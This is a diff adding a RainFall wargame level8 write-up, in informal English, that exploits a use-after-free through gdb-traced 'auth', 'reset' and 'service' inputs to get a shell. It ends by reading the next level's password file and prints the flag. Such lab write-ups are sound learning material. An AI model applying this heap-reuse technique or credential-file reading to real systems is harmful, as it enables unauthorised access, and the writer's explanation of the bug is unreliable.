@@ -1,0 +1,214 @@
+this level is literally a free-after-use vulnerability
+this vulnerability works when u use a varibale after getting it freed
+
+the program has a main function that has some hints to work with
+auth, service, reset, login
+
+after examining them we notice you need basically to create an auth using "auth something"
+then set a password then login with it
+
+to let the workflow easy and informative in gdb, make a break point at printf:
+(gdb) break *0x08048591
+
+ > then make a command to print some data:
+--------------------------------------------------------------
+(gdb) command
+Type commands for breakpoint(s) 1, one per line.
+End with a line saying just "end".
+>echo "--------------------------\n"
+>x/s auth
+>echo "--------------------------\n"
+>x/30wx 0x804a000
+>continue
+>end
+(gdb)
+--------------------------------------------------------------
+
+ > now we can just run the program:
+---------------------------------------------------------------
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level8/level8
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x0:	 <Address 0x0 out of bounds>
+"--------------------------
+"0x804a000:	Cannot access memory at address 0x804a000
+(gdb)
+--------------------------------------------------------------
+
+ > now just press continue:
+--------------------------------------------------------------
+(gdb) c
+Continuing.
+(nil), (nil)
+--------------------------------------------------------------
+
+ > as u can see the program start with null means nothing is allocated
+but if we make an auth the first adrress change:
+--------------------------------------------------------------
+auth admin
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x804a008:	 "admin\n"
+"--------------------------
+"0x804a000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000
+0x804a008, (nil)
+----------------------------------------------------------------
+
+ > so auth has admin in it and we can see it allocated in the memory
+and the size of bytes allocated are wrong because of how the program variables names are
+named the same way so the program didn't take the real auth size
+
+ > now look at the most bad part .. if we check we will notice that the
+reset free auth:
+but when we do it the adress of auth literally stays even if its place in memory is 
+
+ > set to zeroes but the pointed is still there pointing on that place:
+----------------------------------------------------------------
+reset
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x804a008:	 ""
+"--------------------------
+"0x804a000:	0x00000000	0x00000011	0x00000000	0x00000a6e
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000
+0x804a008, (nil)
+-------------------------------------------------------------
+
+ > and that's out way to the use-after-free
+
+ > we can override the memory as it's still pointing to the address and put garbage till
+we make the variable that's allocated in memory not zeroes which wil help us login
+
+--------------------------------------------------------------
+service AAAA
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x804a008:	 " AAAA\n"
+"--------------------------
+"0x804a000:	0x00000000	0x00000011	0x41414120	0x00000a41
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000
+0x804a008, 0x804a008
+----------------------------------------------------------------
+
+ > look at how it has now the AAAA we gave it, but if we press login we won't be able to
+access because we still didn t override the variavle that's responsinle for it
+
+-----------------------------------------------------------------
+login
+Password:
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x804a008:	 " AAAA\n"
+"--------------------------
+"0x804a000:	0x00000000	0x00000011	0x41414120	0x00000a41
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000
+0x804a008, 0x804a008
+-------------------------------------------------------------
+
+ > look at how the programm still asks us for the pasword
+
+-------------------------------------------------------------
+service BBBB
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x804a008:	 " AAAA\n"
+"--------------------------
+"0x804a000:	0x00000000	0x00000011	0x41414120	0x00000a41
+0x804a010:	0x00000000	0x00000011	0x42424220	0x00000a42
+0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+---Type <return> to continue, or q <return> to quit---
+0x804a070:	0x00000000	0x00000000
+0x804a008, 0x804a018
+login
+Password:
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x804a008:	 " AAAA\n"
+"--------------------------
+"0x804a000:	0x00000000	0x00000011	0x41414120	0x00000a41
+0x804a010:	0x00000000	0x00000011	0x42424220	0x00000a42
+0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000
+0x804a008, 0x804a018
+----------------------------------------------------------------------
+
+ > we still didn't get the variable, let's try one more time:
+--------------------------------------------------------------
+service CCCC
+
+Breakpoint 1, 0x08048591 in main ()
+"--------------------------
+"0x804a008:	 " AAAA\n"
+"--------------------------
+"0x804a000:	0x00000000	0x00000011	0x41414120	0x00000a41
+0x804a010:	0x00000000	0x00000011	0x42424220	0x00000a42
+0x804a020:	0x00000000	0x00000011	0x43434320	0x00000a43
+0x804a030:	0x00000000	0x00020fd1	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000
+0x804a008, 0x804a028
+login
+$
+--------------------------------------------------------------
+
+and here we are we literally got the shell.. we finally override the address of the variabble
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth admin
+0x804a008, (nil)
+service AAAA
+0x804a008, 0x804a018
+service BBBB
+0x804a008, 0x804a028
+service CCCC
+0x804a008, 0x804a038
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$
